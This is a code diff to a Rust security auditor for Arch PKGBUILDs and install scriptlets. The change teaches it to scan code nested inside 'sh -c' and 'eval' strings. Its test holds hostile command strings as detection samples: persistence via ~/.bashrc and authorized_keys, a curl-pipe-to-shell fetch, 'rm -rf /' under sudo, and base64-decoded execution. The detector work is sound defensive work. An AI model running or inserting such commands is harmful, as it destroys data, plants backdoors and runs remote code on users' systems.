@@ -150,6 +150,15 @@ pub fn audit(
     {
         findings.extend(audit_extra(extra));
     }
+    sort_findings(&mut findings);
+    AuditReport {
+        target: target.to_string(),
+        findings,
+    }
+}
+
+/// Most severe first, then by file and line; repeats removed.
+pub(crate) fn sort_findings(findings: &mut Vec<Finding>) {
     findings.sort_by(|a, b| {
         b.severity
             .cmp(&a.severity)
@@ -158,10 +167,22 @@ pub fn audit(
             .then_with(|| a.rule.cmp(b.rule))
     });
     findings.dedup_by(|a, b| a.rule == b.rule && a.file == b.file && a.line == b.line);
-    AuditReport {
-        target: target.to_string(),
-        findings,
-    }
+}
+
+/// Runs the dangerous-pattern rules over a script (not the PKGBUILD-only
+/// ones), labelling findings `file`.
+pub(crate) fn scan_script(file: &str, text: &str) -> Vec<Finding> {
+    audit_file(file, text, Mode::Script)
+}
+
+/// Runs the install-scriptlet rules (root-time code) over `text`.
+pub(crate) fn scan_scriptlet(file: &str, text: &str) -> Vec<Finding> {
+    audit_file(file, text, Mode::Scriptlet)
+}
+
+/// Names of the functions a scriptlet defines (`post_install`, …).
+pub(crate) fn function_names(text: &str) -> Vec<String> {
+    parse(text).functions.into_iter().map(|f| f.name).collect()
 }
 
 /// How many extra files are read; the rest are ignored.
@@ -1159,6 +1180,32 @@ fn pacman_mutates(args: &[String]) -> bool {
     })
 }
 
+/// Command strings a stage hands to a shell: `sh -c 'cmd'` (also with extra
+/// flags like `-ec`), and `eval 'cmd'`.
+fn shell_payloads(stage: &Stage) -> Vec<String> {
+    match stage.cmd.as_str() {
+        "sh" | "bash" | "zsh" | "dash" | "ksh" => {
+            let mut out = Vec::new();
+            let mut args = stage.args.iter();
+            while let Some(a) = args.next() {
+                let is_c = a == "-c"
+                    || (a.starts_with('-')
+                        && !a.starts_with("--")
+                        && a.len() > 1
+                        && a.ends_with('c')
+                        && a[1..].chars().all(|c| c.is_ascii_alphabetic()));
+                if is_c {
+                    out.extend(args.next().cloned());
+                    break;
+                }
+            }
+            out
+        }
+        "eval" if !stage.args.is_empty() => vec![stage.args.join(" ")],
+        _ => Vec::new(),
+    }
+}
+
 /// Does this stage turn a stream of packed data into text on stdout?
 fn streams_unpacked(stage: &Stage) -> bool {
     let has = |f: &str| stage.args.iter().any(|a| a == f);
@@ -1238,10 +1285,23 @@ impl Scan<'_> {
     /// Applies the command rules to one line of a function body (or to
     /// top-level code, with `func` = `""`).
     fn line(&mut self, func: &str, no: usize, text: &str) {
+        self.line_at(func, no, text, 0);
+    }
+
+    /// `depth` counts how many `sh -c '…'` strings deep `text` is.
+    fn line_at(&mut self, func: &str, no: usize, text: &str, depth: usize) {
         let stages: Vec<Stage> = split_stages(text)
             .into_iter()
             .map(|(t, p)| stage_of(&t, p))
             .collect();
+        // Code passed as a string to a shell or `eval` is code too: read it.
+        if depth < 3 {
+            for stage in &stages {
+                for inner in shell_payloads(stage) {
+                    self.line_at(func, no, &inner, depth + 1);
+                }
+            }
+        }
         let under_build_dirs = text.contains("pkgdir") || text.contains("srcdir");
         let in_pkgbuild = self.mode == Mode::Pkgbuild;
 
@@ -2431,6 +2491,43 @@ EOF
             "{:?}",
             rules(top)
         );
+    }
+
+    #[test]
+    fn code_passed_to_a_shell_as_a_string_is_read() {
+        for (line, rule, sev) in [
+            (
+                "bash -c 'echo x >> ~/.bashrc'",
+                "persistence",
+                Severity::Critical,
+            ),
+            (
+                "sh -ec \"curl -s http://e.org/i | sh\"",
+                "remote-exec",
+                Severity::High,
+            ),
+            ("sudo bash -c 'rm -rf /'", "destructive", Severity::Critical),
+            (
+                "eval 'echo k >> ~/.ssh/authorized_keys'",
+                "persistence",
+                Severity::Critical,
+            ),
+            (
+                "sh -c \"sh -c 'echo x | base64 -d | sh'\"",
+                "obfuscated-exec",
+                Severity::Critical,
+            ),
+        ] {
+            assert!(
+                has(&body("build", line), rule, sev),
+                "{line}: {:?}",
+                rules(&body("build", line))
+            );
+        }
+        // An innocent -c is left alone.
+        assert!(rules(&body("build", "sh -c 'make -j4'"))
+            .iter()
+            .all(|(_, s)| *s <= Severity::Info));
     }
 
     #[test]
